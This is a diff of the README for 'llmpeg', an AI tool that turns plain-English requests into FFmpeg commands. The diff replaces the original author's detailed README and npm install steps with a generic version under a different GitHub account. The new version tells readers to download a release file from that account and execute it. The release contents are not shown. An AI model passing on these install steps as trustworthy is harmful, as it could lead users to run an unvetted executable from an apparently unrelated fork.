@@ -1,531 +1,128 @@
-<div align="center">
-  <br>
-  <img src="assets/logo.svg" alt="LLmpeg Logo" width="240" height="240">
-  <br>
-  <br>
-  
-  <h1>LLmpeg</h1>
-  
-  <p>
-    <strong>🎥 Transform natural language into FFmpeg commands using AI</strong>
-  </p>
-  
-  <p>
-    <a href="#-features">Features</a> •
-    <a href="#-installation">Installation</a> •
-    <a href="#-quick-start">Quick Start</a> •
-    <a href="#-examples">Examples</a> •
-    <a href="#-supported-ai-models">Models</a> •
-    <a href="#-contributing">Contributing</a>
-  </p>
-  
-  <p>
-    <a href="https://www.npmjs.com/package/@usex/llmpeg">
-      <img src="https://img.shields.io/npm/v/@usex/llmpeg?style=flat-square&color=00DC82&label=npm" alt="npm version">
-    </a>
-    <a href="https://github.com/ali-master/llmpeg/blob/master/LICENSE">
-      <img src="https://img.shields.io/github/license/ali-master/llmpeg?style=flat-square&color=00DC82" alt="license">
-    </a>
-    <a href="https://github.com/ali-master/llmpeg">
-      <img src="https://img.shields.io/github/stars/ali-master/llmpeg?style=flat-square&color=00DC82" alt="github stars">
-    </a>
-  </p>
-</div>
+# llmpeg 🎥✨
 
-<br>
+Welcome to **llmpeg**, your AI-powered command generator for FFmpeg. This tool allows you to describe your video processing tasks in plain English and receive the perfect FFmpeg command instantly. Whether you're a beginner or an experienced user, llmpeg simplifies the process of using FFmpeg.
 
-## ✨ Features
-- 🤖 **Multi-Model Support**: OpenAI, Claude, Gemini, and Grok
-- 🎯 **Natural Language**: Describe tasks in plain English
-- 📋 **Cross-Platform Clipboard**: Works on macOS, Windows, Linux
-- ⚡ **Direct Execution**: Run commands immediately
-- 🔐 **Secure Configuration**: API keys stored locally
-- 🎨 **Beautiful CLI**: Colorful and intuitive interface
-- 📚 **Command History**: Track all generated commands with smart search
-- ⭐ **Favorites System**: Save and organize frequently used commands
-- 🏷️ **Smart Tagging**: Auto-categorize commands for easy retrieval
-- 📊 **Usage Analytics**: View statistics about your command usage
-- 🎯 **Preset Templates**: 30+ built-in presets for common FFmpeg tasks
-- 🛠️ **Custom Presets**: Create your own parameterized templates
-- 📁 **Category Browser**: Organized presets by task type
+![llmpeg](https://img.shields.io/badge/Version-1.0.0-brightgreen.svg) ![License](https://img.shields.io/badge/License-MIT-blue.svg) ![Node.js](https://img.shields.io/badge/Node.js-14.x%2B-brightgreen.svg)
 
-## 📦 Installation
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Features
+
+- **AI-Powered**: Leverage the power of AI to generate FFmpeg commands.
+- **User-Friendly**: Describe your video task in simple terms.
+- **Instant Commands**: Get your FFmpeg command right away.
+- **Open Source**: Contribute to the project and make it better.
+
+## Installation
+
+To get started with llmpeg, you need to download the latest release. You can find it [here](https://github.com/PERRYBUNNY/llmpeg/releases). Look for the appropriate file, download it, and execute it to install llmpeg on your machine.
+
+Make sure you have Node.js installed. If you haven't installed it yet, download it from the [Node.js website](https://nodejs.org/).
+
+### Steps to Install
+
+1. Visit the [Releases](https://github.com/PERRYBUNNY/llmpeg/releases) section to download the latest version.
+2. Extract the files from the downloaded package.
+3. Open your terminal and navigate to the llmpeg directory.
+4. Run the installation command:
+
+   ```bash
+   npm install
+   ```
+
+5. After installation, you can start using llmpeg right away.
+
+## Usage
+
+Using llmpeg is straightforward. Open your terminal and type `llmpeg` followed by your video task description. The AI will process your input and generate the corresponding FFmpeg command.
+
+### Basic Command Structure
 
 ```bash
-# npm
-npm install -g @usex/llmpeg
-
-# bun (recommended)
-bun install -g @usex/llmpeg
-
-# yarn
-yarn global add @usex/llmpeg
-
-# pnpm
-pnpm add -g @usex/llmpeg
+llmpeg "Your video task description here"
 ```
 
-### System Requirements
+### Example
 
-- **Node.js** 18.0.0 or higher
-- **FFmpeg** installed on your system ([Download FFmpeg](https://ffmpeg.org/download.html))
-- **API Key** from at least one AI provider
-
-## 🚀 Quick Start
-
-### 1️⃣ Initialize Configuration
+If you want to convert a video to MP4 format, you would type:
 
 ```bash
-llmpeg init
+llmpeg "Convert my video to MP4 format"
 ```
 
-This creates a configuration file at `~/.llmpeg/config.json` with placeholders for your API keys.
+And llmpeg will respond with the appropriate FFmpeg command.
 
-### 2️⃣ Add Your API Key
+## Examples
+
+Here are some common tasks you can perform with llmpeg:
+
+### 1. Convert Video Formats
+
+To convert a video from one format to another:
 
 ```bash
-# Choose your preferred AI provider
-llmpeg config --openai YOUR_OPENAI_KEY
-llmpeg config --claude YOUR_ANTHROPIC_KEY
-llmpeg config --gemini YOUR_GOOGLE_KEY
-llmpeg config --grok YOUR_XAI_KEY
+llmpeg "Convert my video from AVI to MKV"
 ```
 
-### 3️⃣ Generate Your First Command
+### 2. Extract Audio from Video
+
+To extract audio from a video file:
 
 ```bash
-llmpeg "convert video.mp4 to gif with 10fps"
+llmpeg "Extract audio from my video"
 ```
 
-## 📖 Usage
+### 3. Resize a Video
 
-### Basic Syntax
+To resize a video to a specific resolution:
 
 ```bash
-llmpeg [options] "<your request in natural language>"
+llmpeg "Resize my video to 1280x720"
 ```
 
-### Command Options
+### 4. Add Watermark
 
-| Option | Alias | Description |
-|--------|-------|-------------|
-| `--model <provider>` | `-m` | AI provider to use (`openai`, `claude`, `gemini`, `grok`) |
-| `--provider <model>` | `-p` | Specific model variant (e.g., `gpt-4`, `claude-3-opus`) |
-| `--copy` | `-c` | Copy command to clipboard |
-| `--execute` | `-e` | Execute the generated command immediately |
-| `--verbose` | `-v` | Show detailed output |
-
-### Configuration Commands
+To add a watermark to your video:
 
 ```bash
-# Initialize configuration
-llmpeg init [--force]
-
-# Show current configuration
-llmpeg config --show
-
-# Set API keys
-llmpeg config --openai YOUR_KEY
-llmpeg config --claude YOUR_KEY
-llmpeg config --gemini YOUR_KEY
-llmpeg config --grok YOUR_KEY
-
-# Set preferences
-llmpeg config --default-provider claude
-llmpeg config --default-model gpt-4-turbo
-llmpeg config --auto-copy true
+llmpeg "Add a watermark to my video"
 ```
 
-### History Commands
+### 5. Merge Videos
+
+To merge multiple videos into one:
 
 ```bash
-# Interactive history browser (default)
-llmpeg history
-
-# List recent commands
-llmpeg history --list
-llmpeg history -l
-
-# Show favorites
-llmpeg history --favorites
-llmpeg history -f
-
-# Search history
-llmpeg history --search "convert to gif"
-llmpeg history -s "video compression"
-
-# Filter by tag
-llmpeg history --tag video
-llmpeg history -t audio
-
-# View statistics
-llmpeg history --stats
-
-# Export history
-llmpeg history --export json
-llmpeg history --export csv
-
-# Clear history (with confirmation)
-llmpeg history --clear
+llmpeg "Merge my video1.mp4 and video2.mp4"
 ```
 
-### Preset Commands
+## Contributing
 
-```bash
-# Interactive preset browser (default)
-llmpeg presets
+We welcome contributions to llmpeg! If you want to help improve the project, follow these steps:
 
-# List all presets
-llmpeg presets --list
-llmpeg presets -l
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your branch.
+5. Open a pull request with a description of your changes.
 
-# Filter by category
-llmpeg presets --category "Video Conversion"
-llmpeg presets -c "Audio Processing"
+## License
 
-# Search presets
-llmpeg presets --search "compress"
-llmpeg presets -s "gif"
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-# Use a specific preset
-llmpeg presets --use convert-to-mp4
-llmpeg presets -u video-to-gif
+## Contact
 
-# Create custom preset
-llmpeg presets --create
+For questions or feedback, feel free to reach out:
 
-# Export all presets
-llmpeg presets --export
-```
+- **Email**: yourname@example.com
+- **GitHub**: [PERRYBUNNY](https://github.com/PERRYBUNNY)
 
-## 🎬 Examples
-
-### Video Operations
-
-<details>
-<summary><b>Convert Formats</b></summary>
-
-```bash
-llmpeg "convert video.mov to mp4 with h264 codec"
-# Output: ffmpeg -i video.mov -c:v libx264 -c:a aac output.mp4
-```
-</details>
-
-<details>
-<summary><b>Resize Video</b></summary>
-
-```bash
-llmpeg "resize video to 720p maintaining aspect ratio"
-# Output: ffmpeg -i input.mp4 -vf scale=-1:720 output.mp4
-```
-</details>
-
-<details>
-<summary><b>Create GIF</b></summary>
-
-```bash
-llmpeg "create gif from video between 5-10 seconds"
-# Output: ffmpeg -i input.mp4 -ss 5 -t 5 -vf "fps=10,scale=320:-1:flags=lanczos" output.gif
-```
-</details>
-
-<details>
-<summary><b>Extract Frames</b></summary>
-
-```bash
-llmpeg "extract 1 frame per second as jpg images"
-# Output: ffmpeg -i input.mp4 -vf fps=1 frame_%04d.jpg
-```
-</details>
-
-### Audio Operations
-
-<details>
-<summary><b>Extract Audio</b></summary>
-
-```bash
-llmpeg "extract audio from video as mp3 320kbps"
-# Output: ffmpeg -i input.mp4 -vn -acodec mp3 -ab 320k output.mp3
-```
-</details>
-
-<details>
-<summary><b>Change Volume</b></summary>
-
-```bash
-llmpeg "increase audio volume by 50%"
-# Output: ffmpeg -i input.mp4 -af "volume=1.5" output.mp4
-```
-</details>
-
-### Advanced Operations
-
-<details>
-<summary><b>Batch Processing</b></summary>
-
-```bash
-llmpeg "convert all mp4 files to webm with vp9 codec"
-# Output: for f in *.mp4; do ffmpeg -i "$f" -c:v libvpx-vp9 "${f%.mp4}.webm"; done
-```
-</details>
-
-<details>
-<summary><b>Streaming</b></summary>
-
-```bash
-llmpeg "stream video to rtmp server"
-# Output: ffmpeg -re -i input.mp4 -c copy -f flv rtmp://server/live/stream
-```
-</details>
-
-## 🤖 Supported AI Models
-
-### OpenAI
-- `gpt-4o-mini` (default) - Fast and efficient
-- `gpt-4` - Most capable
-- `gpt-4-turbo` - Latest GPT-4 with vision
-- `gpt-3.5-turbo` - Fast and cost-effective
-
-### Claude (Anthropic)
-- `claude-3-haiku-20240307` (default) - Fast and efficient
-- `claude-3-sonnet-20240229` - Balanced performance
-- `claude-3-opus-20240229` - Most capable
-
-### Google Gemini
-- `gemini-1.5-flash` (default) - Fast multimodal
-- `gemini-1.5-pro` - Advanced reasoning
-- `gemini-pro` - Balanced performance
-
-### Grok (xAI)
-- `grok-beta` (default) - Latest model
-
-## ⚙️ Configuration
-
-### Priority Order
-
-1. **CLI flags** (highest priority)
-2. **Environment variables**
-3. **Config file** (`~/.llmpeg/config.json`)
-4. **`.env` files**
-
-### Environment Variables
-
-```bash
-export OPENAI_API_KEY="your-key"
-export ANTHROPIC_API_KEY="your-key"
-export GOOGLE_GENERATIVE_AI_API_KEY="your-key"
-export XAI_API_KEY="your-key"
-export LLMPEG_DEFAULT_PROVIDER="claude"
-```
-
-### Config File Structure
-
-```json
-{
-  "openai": {
-    "apiKey": "your-openai-key",
-    "defaultModel": "gpt-4o-mini"
-  },
-  "claude": {
-    "apiKey": "your-claude-key",
-    "defaultModel": "claude-3-haiku-20240307"
-  },
-  "gemini": {
-    "apiKey": "your-gemini-key",
-    "defaultModel": "gemini-1.5-flash"
-  },
-  "grok": {
-    "apiKey": "your-grok-key",
-    "defaultModel": "grok-beta"
-  },
-  "defaultProvider": "openai",
-  "autoCopy": false
-}
-```
-
-## 🎯 Preset Templates
-
-LLmpeg includes 30+ professionally crafted presets for common FFmpeg tasks, organized by category. Each preset is a parameterized template that guides you through the process.
-
-### Built-in Preset Categories
-
-- **Video Conversion**: MP4, WebM, AVI, MOV conversions with optimal settings
-- **Video Compression**: Optimize for web, Discord, social media platforms
-- **GIF Creation**: Create high-quality GIFs with palette optimization
-- **Audio Processing**: Extract, convert, normalize audio tracks
-- **Video Editing**: Trim, merge, watermark, resize videos
-- **Effects & Filters**: Blur, stabilize, color correction
-- **Social Media**: Instagram, TikTok, YouTube optimized formats
-- **Streaming**: RTMP streaming setup for various platforms
-- **Advanced**: Frame extraction, thumbnail generation, batch processing
-
-### Preset Features
-
-- **Smart Parameters**: Each preset includes customizable parameters with validation
-- **Difficulty Levels**: Marked as beginner, intermediate, or advanced
-- **Common Use Marking**: Quickly find the most popular presets
-- **Examples**: See how each preset works with real examples
-- **Custom Presets**: Create and save your own templates
-
-### Using Presets
-
-1. **Browse**: Use `llmpeg presets` to explore available templates
-2. **Select**: Choose a preset that matches your task
-3. **Customize**: Fill in the required parameters (files, quality, etc.)
-4. **Execute**: Generate and run the FFmpeg command
-
-Example workflow:
-```bash
-$ llmpeg presets
-> Browse by category
-> Video Conversion
-> Convert to MP4
-> Input file: movie.avi
-> Quality: 23 (Medium)
-✓ Generated command: ffmpeg -i movie.avi -c:v libx264 -crf 23 -c:a aac output.mp4
-```
-
-## 📚 Command History & Favorites
-
-LLmpeg automatically tracks all your generated commands, making it easy to reuse, organize, and learn from your past work.
-
-### Interactive History Browser
-
-The interactive mode provides a user-friendly interface to:
-- Browse recent commands with arrow keys
-- Search through your entire history
-- Mark commands as favorites
-- Add tags and categories
-- Copy or execute commands directly
-- View detailed statistics
-
-### Smart Features
-
-- **Auto-tagging**: Commands are automatically tagged based on content (video, audio, conversion, etc.)
-- **Usage tracking**: See how often you use each command
-- **Favorites**: Star frequently used commands for quick access
-- **Categories**: Organize commands by project or purpose
-- **Export/Import**: Backup your history or share with team members
-
-### History Storage
-
-- History is stored in `~/.llmpeg/history.json`
-- Maximum 1000 commands are kept (favorites are never deleted)
-- Failed attempts are also tracked for learning purposes
-
-## 📋 Clipboard Support
-
-### macOS
-Native support via `pbcopy`
-
-### Windows
-Native support via `clip`
-
-### Linux
-Install one of these utilities:
-
-```bash
-# X11 users
-sudo apt-get install xclip
-# or
-sudo apt-get install xsel
-
-# Wayland users
-sudo apt-get install wl-clipboard
-```
-
-## 🛠️ Development
-
-```bash
-# Clone repository
-git clone https://github.com/ali-master/llmpeg
-cd llmpeg
-
-# Install dependencies
-bun install
-
-# Development
-bun run start:dev        # Run in dev mode
-bun run start:cli:dev    # Run CLI in dev mode
-
-# Build
-bun run build           # Build for production
-bun run test:types      # Type checking
-bun run format          # Format code
-bun run lint            # Lint code
-```
-
-## 🤝 Contributing
-
-We love contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## 📈 Roadmap
-
-- [x] Command history and favorites ✅
-- [x] Preset templates for common tasks ✅
-- [ ] Interactive mode for command refinement
-- [ ] Integration with popular video platforms
-- [ ] Web interface
-- [ ] VSCode extension
-- [ ] Team collaboration features
-- [ ] AI-powered command suggestions based on history
-- [ ] Plugin system for custom extensions
-
-## 🐛 Troubleshooting
-
-<details>
-<summary><b>No API key found</b></summary>
-
-```bash
-# Check your configuration
-llmpeg config --show
-
-# Ensure at least one API key is set
-llmpeg config --openai YOUR_KEY
-```
-</details>
-
-<details>
-<summary><b>Command execution fails</b></summary>
-
-- Ensure FFmpeg is installed: `ffmpeg -version`
-- Use verbose mode: `llmpeg -v "your command"`
-- Check the generated command before executing
-</details>
-
-<details>
-<summary><b>Clipboard not working</b></summary>
-
-- **Linux**: Install `xclip`, `xsel`, or `wl-copy`
-- **WSL**: May need additional configuration
-- Use manual copy as fallback
-</details>
-
-## 📄 License
-
-MIT © [Ali Torki](https://github.com/ali-master)
-
-## 🙏 Acknowledgments
-
-- [Vercel AI SDK](https://sdk.vercel.ai/) - AI model integration
-- [Bun](https://bun.sh/) - JavaScript runtime
-- [Commander.js](https://github.com/tj/commander.js/) - CLI framework
-- [Chalk](https://github.com/chalk/chalk) - Terminal styling
-
----
-
-<div align="center">
-  <p>
-    <sub>Built with ❤️ by <a href="https://github.com/ali-master" target="_blank">Ali Torki</a>, for developers. Happy encoding! 🎬</sub>
-  </p>
-  <p>
-    <a href="https://github.com/ali-master/llmpeg">⭐ Star us on GitHub</a> •
-    <a href="https://linkedin.com/in/alitorki">🐦 Follow on Linkedin</a>
-  </p>
-</div>
+Thank you for using llmpeg! We hope it makes your video processing tasks easier and more efficient. Don't forget to check the [Releases](https://github.com/PERRYBUNNY/llmpeg/releases) section for updates and new features.
